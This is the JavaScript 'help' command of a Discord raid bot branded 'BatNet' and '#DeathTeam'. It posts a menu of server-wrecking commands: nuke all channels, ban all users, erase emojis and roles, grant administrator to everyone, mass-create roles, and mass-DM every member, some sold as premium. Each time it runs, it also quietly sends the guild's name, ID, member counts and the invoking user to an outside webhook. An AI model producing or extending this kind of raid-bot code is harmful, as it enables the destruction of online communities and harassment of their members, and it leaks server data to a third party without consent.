const Discord = require('discord.js');
const chalk = require('chalk');
const fetch = require('node-fetch');
const util = require('./utilities/ignore.json');
const emojis = require('./utilities/emojis.json');

////// COMMAND //////

module.exports = {
     name: 'help',
     aliases: ['h'],
     description: '',
     
async execute(client, message, args){
     setTimeout(function() {
          
          console.log(chalk.cyan(`\n[ BATNET ] ${message.author.tag} Has executed the help command`));
          console.log(chalk.cyan(`[ BATNET ] Sending log to the webhook.\n`));
          
          const log = {
               username: 'BatNet | Logging',
               avatar_url: 'https://cdn.discordapp.com/avatars/1081612143566270635/8511dc5a9f3fda4f7af646dc4cd0c901.png?size=2048',
               content: '',
               embeds: [
                    {
                         description: `${emojis.bat} **| Command:**\n*__.help__*\n\n${emojis.beer} **| Guild:**\n*__${message.guild.name} ( ${message.guild.id} )__*\n\n${emojis.crown} **| Channels:**\n*__${message.guild.channels.cache.size}__*\n\n${emojis.wings} **| Roles:**\n*__${message.guild.roles.cache.size}__*\n\n${emojis.sparks} **| Users:**\n*__${message.guild.memberCount}__*\n\n${emojis.pin} **| Author:**\n${message.author.tag}`,
                         author: {
                              name: 'BatNet',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                         },
                         thumbnail: {
                              url: util.server_logo
                         },
                         footer: {
                              text: '#DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                         },
                         color: 0x0000
                         }
                    ]
          }
          
          fetch(util.webhook_url, {
               method: 'POST',
               headers: {
                    'Content-type': 'application/json'
               },
               body: JSON.stringify(log)
          });
          
          message.delete();
          
          const embed = new Discord.MessageEmbed();
          
          message.channel.send({
               embed: {
                    description: `${emojis.bat} **| Non-Premium.**\n\n*.fuck* ‐ Execute all the non-premium bot commands.\n*.help* ‐ Send a embed with the commands,\n*.nuke* ‐ Delete all channels leaving only one for the rest of the commands.\n*.raid* ‐ *Raid the guild at once.*\n*.banall* ‐ Ban all possible users\n*.emojis* ‐ Erase all the emojis on the guild.\n*.invite* ‐ Invite the bot to a guild.\n*.admin* ‐ Give administrator perms to the server.\n*.leave* ‐ Leave the guild.\n*.admin_all* ‐ Give administrator perms to all the members on the guild.\n\n${emojis.boost} **| Premium**\n\n*.end* ‐ Execute the best bot commands, including the premium and non-premium\n*.clean* ‐ Delete all the channels, roles and emojis of the server.\n*.mdall* ‐ Send a direct message to all possible members.\n*.crole* ‐ Create thousands of roles on the guild.\n*.drole* ‐ Delete all the roles on the guild.`,
                    author: {
                              name: 'Help',
                              url: 'https://discord.gg/DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
                         },
                         thumbnail: {
                              url: util.server_logo
                         },
                         footer: {
                              text: '#DeathTeam',
                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
                         },
                         color: 0x0000
                    }
               });
     }, 5000);
}
}
